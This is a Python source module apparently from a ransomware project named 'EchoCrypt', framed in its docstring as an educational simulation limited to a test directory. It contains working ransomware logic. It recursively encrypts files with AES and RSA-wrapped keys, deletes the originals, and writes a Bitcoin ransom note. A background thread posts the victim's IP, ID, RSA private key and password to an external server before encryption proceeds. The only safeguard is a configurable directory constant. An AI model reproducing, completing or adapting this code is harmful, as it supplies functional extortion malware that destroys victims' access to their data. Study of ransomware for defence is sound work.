import os
import sys
import logging
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
from cryptography.hazmat.primitives import serialization
import base64
import json
import shutil
import getpass 
import random 
import requests 
import threading
import socket
import time

from .constants import ( 
    TARGET_FILE_EXTENSIONS, ENCRYPTED_FILE_EXTENSION, RANSOM_NOTE_FILENAME,
    ENCRYPTION_METADATA_FILENAME, SERVER_URL, RETRY_DELAY_SECONDS, 
    AES_KEY_SIZE, RSA_KEY_SIZE, DIRECTORY, PBKDF2_SALT_SIZE, 
    PBKDF2_ITERATIONS, AES_BLOCK_SIZE
)

# --- Logging Setup Start ---
log_filename = 'echocrypt.log'
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_filename),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)
# --- Logging Setup End ---

class Ransomware:
    """
    This is a class that performs file encryption and decryption like ransomware.
    It is strictly designed for educational purposes only.

    ⚠️ WARNING: Never modify the DIRECTORY path in constants.py to '/' or 'C:/'.

    All operations are performed only within the default 'test_files' directory.
    """

    def __init__(self, target_directory: str = None):
        """
        Initializes the Ransomware object.
        If no target directory is specified, the default 'test_files' directory will be used.
        The directory cannot be specified in main.py — it can only be set in test.py.
        """
        # --- Directory Setup and Validation ---
        if target_directory:
            self.target_directory = os.path.abspath(target_directory)
        else:
            self.target_directory = os.path.abspath(DIRECTORY)

        if not os.path.exists(self.target_directory):
            try:
                os.makedirs(self.target_directory)
                logger.info(f"Target directory '{self.target_directory}' has been created.")
            except OSError as e:
                logger.error(f"Failed to create target directory '{self.target_directory}': {e}")
                sys.exit(1)

        self.private_key = None
        self.public_key = None
        self.ip_address = None
        self.encrypted_files_data = {}
        self.key_exfiltrated = threading.Event()
        self.password = None
        self.victim_id = None
        logger.info("Ransomware has been initialized.")
    # --- Directory Setup and Validation End---

    # --- PBKDF2 Key Derivation Functions Start ---
    def _derive_key_from_password(self, password: str, salt: bytes) -> bytes:
        """
        Derives an encryption key using a password and salt.
        """
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=AES_KEY_SIZE,
            salt=salt,
            iterations=PBKDF2_ITERATIONS,
            backend=default_backend()
        )
        return kdf.derive(password.encode('utf-8'))
    # --- PBKDF2 Key Derivation Functions End ---

    
    # --- RSA Key Management Functions Start ---
    def _generate_rsa_keys(self) -> None:
        """
        Generates an RSA public and private key pair.
        This key pair is used to encrypt and decrypt AES file keys.
        """
        logger.info(f"Generating RSA {RSA_KEY_SIZE}-bit key pair...")
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=RSA_KEY_SIZE,
            backend=default_backend()
        )
        self.public_key = self.private_key.public_key()
        logger.info("RSA key pair generation completed.")

    def _save_rsa_keys(self, public_key_path: str = "public_key.pem") -> None:
        """
        Saves the generated RSA private and public keys to files in PEM format.
        (In this simulation, the private key is assumed to be kept by the attacker.)
        """

        if not self.private_key or not self.public_key:
            logger.error("RSA keys have not been generated and cannot be saved.")
            return

        try:
            with open(public_key_path, "wb") as f:
                f.write(self.public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                ))
            logger.info(f"Public key has been saved to '{public_key_path}'.")
        except Exception as e:
            logger.error(f"An error occurred while saving the RSA key: {e}")
            raise

    def _load_rsa_private_key(self, private_key_path: str = "private_key.pem") -> None:
        """
        Loads the saved RSA private key from a file.
        This private key is required for the decryption process.
        """

        if not os.path.exists(private_key_path):
            logger.error(f"Private key file '{private_key_path}' not found.")
            raise FileNotFoundError(f"RSA private key file '{private_key_path}' not found.")
        

        try:
            with open(private_key_path, "rb") as f:
                self.private_key = serialization.load_pem_private_key(
                    f.read(),
                    password=None,
                    backend=default_backend()
                )
            logger.info(f"Private key successfully loaded from '{private_key_path}'.")
        except Exception as e:
            logger.error(f"An error occurred while loading the RSA private key: {e}")
            self.private_key = None
            raise 

    # --- RSA Key Management Functions End ---

    # --- Start of function to request IP address ---
    def _get_local_ip_address(self):
        """
        Requests the local IP address.
        """
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            self.ip_address = ip_address
            logger.info(f"The local IP address has been confirmed as {ip_address}.")
        except Exception as e:
            logger.error(f"Failed to obtain local IP address (gethostname): {e}")
            self.ip_address = None
    # --- End of IP address request function ---
   
    # --- Start of function to request IP address and send to server ---
    def _exfiltrate_private_key(self) -> None:
        """
        Sends the generated RSA private key and related information to an external server.
        """

        while not self.key_exfiltrated.is_set(): # Repeat until the event is set
            if not self.private_key or not self.ip_address or not self.password or not self.victim_id:
                logger.error("Worker: Private key has not been generated yet, unable to send. Waiting...")
                time.sleep(RETRY_DELAY_SECONDS)
                continue

            if not self.ip_address:
                self._get_local_ip_address() # Retry if IP address is not obtained
                if not self.ip_address:
                    logger.warning("Unable to obtain local IP address; cannot send IP to server.")

            if not self.password:
                logger.warning("Password has not been generated; unable to send to server.")

            try:

                # Convert the private key to a PEM-formatted string
                # In the cryptography library, use private_bytes instead of export_key.
                private_key_pem = self.private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ).decode('utf-8')

                # Construct the data payload to be sent
                payload = {
                    'victim_ip': self.ip_address if self.ip_address else 'unknown',
                    'victim_id': self.victim_id if self.victim_id else 'unknown',
                    'private_key_data': private_key_pem,
                    'password': self.password if self.password else 'unknown_password'
                }
                
                logger.info(f"Attempting to send private key to server '{SERVER_URL}'...")
                
                # Use SERVER_URL defined in constants.py
                response = requests.post(SERVER_URL, json=payload, timeout=10) 
                response.raise_for_status() # Raise exception on HTTP errors (4xx, 5xx)

                logger.info(f"Private key successfully sent. Server response: {response.status_code} - {response.json()}")
                self.key_exfiltrated.set() # Set event (notify successful transmission)
                break 

            except requests.exceptions.Timeout:
                logger.error(f"Server transmission timed out: {SERVER_URL}")
            except requests.exceptions.ConnectionError as e:
                logger.error(f"Failed to connect to server: {SERVER_URL} - {e}")
            except requests.exceptions.HTTPError as e:
                logger.error(f"HTTP error occurred during server transmission: {SERVER_URL} - {e.response.status_code} {e.response.text}")
            except Exception as e:
                logger.error(f"Unknown error occurred during server transmission: {e}")
        # --- End of IP address request and server transmission function ---


    # --- Start of file system traversal function ---
    def _find_target_files(self) -> list:
        """
        Recursively searches for files to encrypt within the specified target directory.
        Only files with the specified target extensions are selected.
        """
        found_files = []
        logger.info(f"Searching for files to encrypt in the target directory '{self.target_directory}'...")
        
        if not os.path.isdir(self.target_directory):
            logger.error(f"Target directory '{self.target_directory}' does not exist or is not a directory.")
            return []

        for root, _, files in os.walk(self.target_directory):
            for filename in files:
                # Skip ransom notes, metadata files, already encrypted files, and PEM key files
                if filename == RANSOM_NOTE_FILENAME or \
                   filename == ENCRYPTION_METADATA_FILENAME or \
                   filename.endswith(ENCRYPTED_FILE_EXTENSION) or \
                   filename.endswith(".pem"): 
                    continue
                
                file_path = os.path.join(root, filename)
                
                if any(file_path.lower().endswith(ext.lower()) for ext in TARGET_FILE_EXTENSIONS):
                    found_files.append(file_path)
                else:
                    logger.debug(f"Skipped file (extension mismatch): {file_path}")
        logger.info(f"Found a total of {len(found_files)} target files.")
        return found_files
    
    def _find_encrypted_files(self) -> list:
        """Searches for encrypted files with the '.echocrypt' extension in the specified directory."""
        found_encrypted_files = []
        logger.info(f"Searching for encrypted files in the target directory '{self.target_directory}'...")
        
        if not os.path.isdir(self.target_directory):
            logger.error(f"Target directory '{self.target_directory}' does not exist or is not a directory.")
            return []

        for root, _, files in os.walk(self.target_directory):
            for filename in files:
                file_path = os.path.join(root, filename)
                if filename.lower().endswith(ENCRYPTED_FILE_EXTENSION.lower()):
                    found_encrypted_files.append(file_path)
                else:
                    logger.debug(f"Skipped file (extension mismatch): {file_path}")
        logger.info(f"Found a total of {len(found_encrypted_files)} target files.")
        return found_encrypted_files

    def _aes_encrypt_file(self, file_path: str, aes_key: bytes, iv: bytes) -> bytes:
        """Encrypts the given file using AES-256-CBC mode."""
        logger.info(f"Encrypting file '{file_path}' with AES...")
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        try:
            with open(file_path, 'rb') as f:
                plaintext = f.read()

            padder = padding.PKCS7(algorithms.AES.block_size).padder()
            padded_data = padder.update(plaintext) + padder.finalize()

            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            logger.info(f"File '{file_path}' encryption completed. Original size: {len(plaintext)} bytes, Ciphertext size: {len(ciphertext)} bytes")
            return ciphertext
        except Exception as e:
            logger.exception(f"Error occurred during AES encryption: {file_path}")  # Includes stack trace
            raise

    def _aes_decrypt_file(self, encrypted_file_path: str, aes_key: bytes, iv: bytes) -> bytes:
        """Decrypts the given encrypted file using AES-256-CBC mode."""
        logger.info(f"Decrypting file '{encrypted_file_path}' with AES...")
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()

        try:
            with open(encrypted_file_path, 'rb') as f:
                ciphertext = f.read()

            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

            unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
            logger.info(f"File '{encrypted_file_path}' decryption completed. Decrypted size: {len(plaintext)} bytes")
            return plaintext
        except Exception as e:
            logger.exception(f"Error occurred during AES decryption: {encrypted_file_path}")  # Includes stack trace
            raise

    def _save_encryption_metadata(self) -> None:
        """
        Saves metadata of encrypted files (original path, encrypted AES key, IV, and salt protecting the encrypted AES key) to a JSON file.
        """
        metadata_path = os.path.join(self.target_directory, ENCRYPTION_METADATA_FILENAME)
        serializable_data = {
            original_path: {
                "encrypted_aes_key": base64.b64encode(data["encrypted_aes_key"]).decode('utf-8'),
                "iv": base64.b64encode(data["iv"]).decode('utf-8'),
                "original_size": data["original_size"],
                "password_salt": base64.b64encode(data["password_salt"]).decode('utf-8'),
                "aes_key_protection_iv": base64.b64encode(data["aes_key_protection_iv"]).decode('utf-8')
            }
            for original_path, data in self.encrypted_files_data.items()
        }
        try:
            with open(metadata_path, 'w', encoding='utf-8') as f:
                json.dump(serializable_data, f, indent=4)
            logger.info(f"Encryption metadata has been saved to '{metadata_path}'.")
        except Exception as e:
            logger.error(f"Error occurred while saving encryption metadata: {e}")
            raise

    def _load_encryption_metadata(self) -> None:
        """Loads the saved encryption metadata from a JSON file."""
        metadata_path = os.path.join(self.target_directory, ENCRYPTION_METADATA_FILENAME)
        if not os.path.exists(metadata_path):
            logger.error(f"Encryption metadata file '{metadata_path}' not found. Cannot proceed with decryption.")
            raise FileNotFoundError(f"Encryption metadata file '{metadata_path}' not found.")

        try:
            with open(metadata_path, 'r', encoding='utf-8') as f:
                loaded_data = json.load(f)
            
            self.encrypted_files_data = {
                original_path: {
                    "encrypted_aes_key": base64.b64decode(data["encrypted_aes_key"].encode('utf-8')),
                    "iv": base64.b64decode(data["iv"].encode('utf-8')),
                    "original_size": data["original_size"],
                    "password_salt": base64.b64decode(data["password_salt"].encode('utf-8')),
                    "aes_key_protection_iv": base64.b64decode(data["aes_key_protection_iv"].encode('utf-8'))
                }
                for original_path, data in loaded_data.items()
            }
            logger.info(f"Encryption metadata successfully loaded from '{metadata_path}'.")
        except FileNotFoundError:
            logger.error(f"Encryption metadata file '{metadata_path}' not found. Cannot proceed with decryption.")
            self.encrypted_files_data = {}
            raise
        except json.JSONDecodeError as e:
            logger.error(f"Parsing error in encryption metadata file '{metadata_path}': {e}. The file may be corrupted.")
            self.encrypted_files_data = {}
            raise
        except Exception as e:
            logger.error(f"Error occurred while loading encryption metadata: {e}")
            raise

    def _create_ransom_note(self, victim_id: str) -> None:
        """Creates a ransom note to inform the user about the encryption and recovery instructions."""
        ransom_note_path = os.path.join(self.target_directory, RANSOM_NOTE_FILENAME)

        # --- Dynamic content for the ransom note ---
        # These values are for simulation purposes.
        # In a real scenario, these would be controlled by the attacker.
        attacker_email = "Example email address" # Example email address
        bitcoin_address = "Example Bitcoin address" # Example Bitcoin address (replace with a dummy one)
        ransom_amount_btc = round(random.uniform(0.1, 30.0), 2) # Random ransom amount between 0.1 and 30.0 BTC

        note_content = f"""
====================================================
            YOUR FILES HAVE BEEN ENCRYPTED           
====================================================

All your important files (documents, photos, videos, databases, etc.) have been **encrypted with strong cryptographic algorithms**. This means your data is currently inaccessible.

**No one can decrypt your files without the unique decryption key.** Any attempts to recover your files using third-party tools or methods will likely result in irreversible data loss.

---

How to Recover Your Files

To restore your data, you must follow these instructions carefully:

1.  **Payment:** You need to pay a ransom in Bitcoin. The exact amount is **{ransom_amount_btc} BTC**.
    Send the payment to the following Bitcoin address:
    **{bitcoin_address}**
    **Do not send money before contacting us.**

2.  **Contact Us:** To initiate the recovery process, send an email to:
    **{attacker_email}**

    In your email, include the following:
    * **Your Victim ID:** This unique identifier helps us recognize your case. Your ID is: **{victim_id}**
    * **Proof of Payment:** Once you've paid, provide the transaction ID (TXID) or a screenshot of your payment.

3.  **Decryption**: Once the payment is confirmed, we will provide you with the necessary instructions/password to restore your files.

---

## Important Warnings

* **DO NOT modify your encrypted files.** Changing them will corrupt your data and make recovery impossible.
* **DO NOT try to decrypt files yourself.** Using external software or methods will permanently damage your files.
* **DO NOT reinstall your operating system.** This will delete the encrypted files and the ransom note, preventing any chance of recovery.
* **Acting quickly is crucial.** Delays in payment may lead to permanent data loss or an increase in the ransom amount.

---

We understand this is a difficult situation. Follow these steps precisely to get your files back safely.


"""
        try:
            with open(ransom_note_path, 'w', encoding='utf-8') as f:
                f.write(note_content)
            logger.warning(f"Ransom note '{ransom_note_path}' has been created. Notifying the user about the encryption.")
        except Exception as e:
            logger.error(f"Error occurred while creating the ransom note: {e}")
            raise

    def run_encryption(self) -> None:
        """
        Executes the file encryption process.
        Includes RSA key generation, file encryption, saving metadata, and creating ransom note.
        """
        logger.info("--- Starting file encryption process ---")

        ransom_note_path = os.path.join(self.target_directory, RANSOM_NOTE_FILENAME)
        metadata_path = os.path.join(self.target_directory, ENCRYPTION_METADATA_FILENAME)



        files_to_encrypt = self._find_target_files()

        if not files_to_encrypt:
            logger.warning("No target files found for encryption. Stopping the simulation.")
            return

        if files_to_encrypt or not (os.path.exists(ransom_note_path) and os.path.exists(metadata_path)):
            try:
                logger.info("Generating new RSA key pair and simulation password...")
                self._generate_rsa_keys()
                self._save_rsa_keys() # Save the generated key locally (public_key.pem)

                logger.info("Requesting IP address...")
                self._get_local_ip_address()

                self.victim_id = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
                self.password = base64.urlsafe_b64encode(os.urandom(12)).decode('utf-8')
                logger.critical("**Encryption complete! The simulation decryption password is as follows (only the attacker possesses this information):**")
                logger.critical(f"**Password: {self.password}**")  # Do not ever comment out this line.
                logger.critical("**This password is NOT included in the ransom note.**")

            except Exception as e:
                logger.error(f"Failed to generate/save RSA key or send to server: {e}")
                return 
        else:
            # If keys already exist and no files to encrypt (i.e., encryption is already done)
            logger.warning("Existing keys and password will be used; the password will not be displayed again.")
            logger.warning("If you want to run a new simulation, please run '--cleanup-test-env' and then execute again.")
            # In this case, the decryption password is from the previous session and won't be re-displayed.
            # Since only the attacker knows the password in this simulator, on re-execution the attacker must use the previously recorded password.
            return

        # Start background  key exfiltration thread
        logger.info("Starting to send the private key to the server in the background...")
        thread = threading.Thread(target=self._exfiltrate_private_key)
        thread.daemon = True # Allows the main program to exit even if this thread is running
        thread.start()

        # Wait indefinitely for the private key to be successfully exfiltrated
        logger.info(f"Waiting for private key transmission success... (Retrying every {RETRY_DELAY_SECONDS} seconds until server connects)")
        self.key_exfiltrated.wait() # This will block until self.key_exfiltrated.set() is called

        logger.info("Private key transmission succeeded. Proceeding with file encryption.")

        # --- Actual file encryption begins here ---
        logger.info(f"Encrypting a total of {len(files_to_encrypt)} target files.")

        for file_path in files_to_encrypt:
            try:
                original_filename_no_ext, _ = os.path.splitext(file_path)
                encrypted_file_path = original_filename_no_ext + ENCRYPTED_FILE_EXTENSION

                aes_key = os.urandom(AES_KEY_SIZE)
                iv_for_file_content = os.urandom(AES_BLOCK_SIZE) # IV for encrypting file content
                aes_key_protection_iv = os.urandom(AES_BLOCK_SIZE) # IV for encrypting the AES key

                rsa_encrypted_aes_key = self.public_key.encrypt(
                    aes_key,
                    rsa_padding.OAEP(
                        mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )

                password_salt = os.urandom(PBKDF2_SALT_SIZE)
                password_derived_key = self._derive_key_from_password(self.password, password_salt)
                
                # When encrypting `rsa_encrypted_aes_key` with `password_derived_key`, use `aes_key_protection_iv`
                cipher_password = Cipher(algorithms.AES(password_derived_key), modes.CBC(aes_key_protection_iv), backend=default_backend())
                encryptor_password = cipher_password.encryptor()
                
                padder_key = padding.PKCS7(algorithms.AES.block_size).padder()
                padded_rsa_encrypted_aes_key = padder_key.update(rsa_encrypted_aes_key) + padder_key.finalize()
                
                final_encrypted_aes_key = encryptor_password.update(padded_rsa_encrypted_aes_key) + encryptor_password.finalize()

                original_file_size = os.path.getsize(file_path)
                ciphertext = self._aes_encrypt_file(file_path, aes_key, iv_for_file_content) # Use `iv_for_file_content` for encrypting the file contents

                with open(encrypted_file_path, 'wb') as f:
                    f.write(ciphertext)
                logger.info(f"Encrypted file saved: {encrypted_file_path} (Size: {len(ciphertext)} bytes)")

                os.remove(file_path)
                logger.info(f"Original file '{file_path}' has been successfully deleted.")

                self.encrypted_files_data[file_path] = {
                    "encrypted_aes_key": final_encrypted_aes_key,
                    "iv": iv_for_file_content, # IV for encrypting file contents
                    "original_size": original_file_size,
                    "password_salt": password_salt,
                    "aes_key_protection_iv": aes_key_protection_iv # Added IV for protecting the AES key
                }
                logger.info(f"Encryption metadata for file '{file_path}' has been recorded successfully.")

            except Exception as e:
                logger.exception(f"Error occurred during encryption of file '{file_path}':")  # Includes stack trace
                continue 

        try:
            self._save_encryption_metadata()
        except Exception as e:
            logger.error(f"Failed to save final encryption metadata: {e}")

        try:
            self._create_ransom_note(self.victim_id)
        except Exception as e:
            logger.error(f"Failed to create ransom note: {e}")

        logger.info("--- File encryption process completed ---")

    def run_decryption(self, private_key_path: str = "private_key.pem", public_key_path: str = "public_key.pem") -> None:
        """
        Runs the file decryption process.
        Includes loading the RSA private key, loading metadata, user password input, and file decryption.
        """
        logger.info("--- File decryption process started ---")

        try:
            encrypted_files = self._find_encrypted_files()

            if not encrypted_files:
                logger.warning(f"No encrypted files with the '.echocrypt' extension found in '{self.target_directory}'. Stopping decryption.")
                return
            
            self._load_rsa_private_key()
            if not self.private_key:
                logger.error("RSA private key for decryption is not loaded. Decryption cannot proceed.")
                return

            self._load_encryption_metadata()
            if not self.encrypted_files_data:
                logger.warning("No encrypted file metadata found for decryption. Stopping simulation.")
                return
        except FileNotFoundError as e: 
            logger.critical(f"Decryption initialization failed: {e}. Cannot proceed with decryption.")
            return
        except Exception as e:
            logger.exception(f"Decryption initialization failed (loading keys/metadata): {e}")
            return

        input_password = getpass.getpass("Enter the decryption password: ")
        if not input_password:
            logger.error("No password entered. Aborting decryption.")
            return

        decrypted_count = 0
        for original_file_path, data in self.encrypted_files_data.items():
            original_base, _ = os.path.splitext(original_file_path)
            encrypted_file_path = original_base + ENCRYPTED_FILE_EXTENSION
            
            if not os.path.exists(encrypted_file_path):
                logger.warning(f"Encrypted file '{encrypted_file_path}' not found, skipping.")
                continue

            try:
                final_encrypted_aes_key = data["encrypted_aes_key"]
                iv_for_file_content = data["iv"] 
                password_salt = data["password_salt"]
                aes_key_protection_iv = data["aes_key_protection_iv"] 

                password_derived_key = self._derive_key_from_password(input_password, password_salt)
                
                # Use aes_key_protection_iv to decrypt final_encrypted_aes_key with password_derived_key
                cipher_password = Cipher(algorithms.AES(password_derived_key), modes.CBC(aes_key_protection_iv), backend=default_backend())
                decryptor_password = cipher_password.decryptor()
                
                padded_rsa_encrypted_aes_key = decryptor_password.update(final_encrypted_aes_key) + decryptor_password.finalize()

                unpadder_key = padding.PKCS7(algorithms.AES.block_size).unpadder()
                rsa_encrypted_aes_key = unpadder_key.update(padded_rsa_encrypted_aes_key) + unpadder_key.finalize()

                aes_key = self.private_key.decrypt(
                    rsa_encrypted_aes_key,
                    rsa_padding.OAEP(
                        mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                
                if len(aes_key) != AES_KEY_SIZE:
                    logger.error(f"Incorrect password: Decrypted AES key length is invalid. Expected: {AES_KEY_SIZE}, Actual: {len(aes_key)}")
                    raise ValueError("Password mismatch or key decryption error.")

                # Use iv_for_file_content for actual AES decryption of the file content
                decrypted_content = self._aes_decrypt_file(encrypted_file_path, aes_key, iv_for_file_content)

                with open(original_file_path, 'wb') as f:
                    f.write(decrypted_content)
                logger.info(f"Decrypted file saved: {original_file_path} (Size: {len(decrypted_content)} bytes)")

                os.remove(encrypted_file_path)
                logger.info(f"Encrypted file '{encrypted_file_path}' has been deleted.")
                decrypted_count += 1

            except (ValueError, TypeError, Exception) as e:
                error_msg = str(e)
                if "PaddingError" in error_msg or \
                   "DecryptionError" in error_msg or \
                   "Invalid padding bytes" in error_msg:
                    logger.critical(f"Error: Critical failure during decryption of file '{encrypted_file_path}'. ({error_msg}) Aborting decryption process.")
                    return  # If the password is incorrect, stop immediately without trying all files.
                else:
                    logger.exception(f"Unexpected error occurred while decrypting file '{encrypted_file_path}': {error_msg}")  # Includes stack trace
                continue

        # Cleanup remaining files after successful decryption (ransom note, metadata, key files)
        ransom_note_path = os.path.join(self.target_directory, RANSOM_NOTE_FILENAME)
        metadata_path = os.path.join(self.target_directory, ENCRYPTION_METADATA_FILENAME)


        for path in [ransom_note_path, metadata_path, private_key_path, public_key_path]:
            if os.path.exists(path):
                try:
                    os.remove(path)
                    logger.info(f"Residual file '{path}' successfully deleted.")
                except Exception as e:
                    logger.error(f"Error occurred while deleting residual file '{path}': {e}")
                
        logger.info(f"--- File decryption process completed. A total of {decrypted_count} files have been decrypted. ---")

    def run_setup(self, num_files: int = 5) -> None:
        """
        Sets up the test environment and creates the specified number of dummy files.
        """
        logger.info(f"--- Test environment setup started: '{self.target_directory}' ---")
        
        if not os.path.exists(self.target_directory):
            try:
                os.makedirs(self.target_directory)
                logger.info(f"Test directory '{self.target_directory}' created.")
            except OSError as e:
                logger.error(f"Failed to create test directory: {e}")
                sys.exit(1)

        dummy_content = "This is a dummy file for ransomware simulation testing.\n" * 10
        file_types = TARGET_FILE_EXTENSIONS

        for i in range(num_files):
            file_extension = random.choice(file_types) # Randomly select a file extension
            file_name = f"dummy_file_{i}{file_extension}"
            file_path = os.path.join(self.target_directory, file_name)

            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(dummy_content + f"File number: {i}\n")
                logger.info(f"Dummy file created: {file_path}")
            except Exception as e:
                logger.error(f"Error occurred while creating dummy file '{file_path}': {e}")
        logger.info(f"--- A total of {num_files} dummy files have been created. ---")
        logger.info("--- Test environment setup completed ---")

    def run_cleanup(self, private_key_path: str = "private_key.pem", public_key_path: str = "public_key.pem") -> None:
        """
        Cleans up the test directory and related files.
        """
        logger.info(f"--- Starting test environment cleanup: '{self.target_directory}' ---")
        
        for handler in logger.handlers[:]:
            if isinstance(handler, logging.FileHandler):
                handler.close()
                logger.removeHandler(handler)

        if os.path.exists(log_filename):
            try:
                os.remove(log_filename)
                logger.info(f"Log file '{log_filename}' deleted successfully.")
            except Exception as e:
                logger.error(f"Failed to delete log file '{log_filename}': {e}")

        if os.path.exists(self.target_directory):
            try:
                shutil.rmtree(self.target_directory)
                logger.info(f"Test directory '{self.target_directory}' has been successfully deleted.")
            except Exception as e:
                logger.error(f"Failed to delete test directory '{self.target_directory}': {e}. This may be due to permission issues.")
        else:
            logger.info(f"Test directory '{self.target_directory}' does not exist.")
        for path in [private_key_path, public_key_path]:
            if os.path.exists(path):
                try:
                    os.remove(path)
                    logger.info(f"Remaining file '{path}' deleted successfully.")
                except Exception as e:
                    logger.error(f"Failed to delete leftover file '{path}': {e}. It may be a permission issue.")
            else:
                logger.info(f"Leftover file '{path}' does not exist anymore.")
        logger.info("--- Test environment cleanup completed ---")